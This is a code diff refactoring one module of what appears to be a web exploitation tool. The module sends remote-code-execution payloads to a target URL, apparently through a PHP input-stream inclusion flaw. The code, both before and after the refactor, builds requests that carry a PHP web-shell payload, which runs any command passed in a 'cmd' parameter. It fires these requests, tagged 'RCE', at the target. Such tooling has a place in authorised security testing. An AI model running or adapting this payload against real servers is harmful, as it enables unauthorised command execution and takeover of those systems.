@@ -1,7 +1,6 @@
-import urllib.parse as urlparse
+"""Input Payload"""
 from src.utils.arguments import args
-from src.configs.config import *
-from src.utils.stats import stats
+from src.configs.config import proxies
 from src.httpreqs.request import prepareRequest
 from src.httpreqs.request import REQUEST
 from src.utils import colors
@@ -41,20 +40,20 @@ def test_input(url, post):
         posts.append("<?php echo(system($_GET['cmd']));?>")
 
     if args.is_tested_param_post:
-        for i, p in enumerate(posts):
-            u, reqHeaders, postTest = prepareRequest(args.param, "", url, p)
+        for idx_post, post in enumerate(posts):
+            u, reqHeaders, postTest = prepareRequest(args.param, "", url, post)
             _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "INPUT")
             if not br:
                 return
-            if i == 1 and args.quick:
+            if idx_post == 1 and args.quick:
                 return
-    else:
-        for i in range(len(tests)):
-            u, reqHeaders, _ = prepareRequest(args.param, tests[i], url, post)
-            for j in range(len(posts)):
-                _, br = REQUEST(u, reqHeaders, posts[j], proxies, "RCE", "INPUT")
-                if not br:
-                    return
-                if j == 1 and args.quick:
-                    return
-    return
+        return
+
+    for _, test in enumerate(tests):
+        u, reqHeaders, _ = prepareRequest(args.param, test, url, post)
+        for idx_post, post in enumerate(posts):
+            _, br = REQUEST(u, reqHeaders, post, proxies, "RCE", "INPUT")
+            if not br:
+                return
+            if idx_post == 1 and args.quick:
+                return
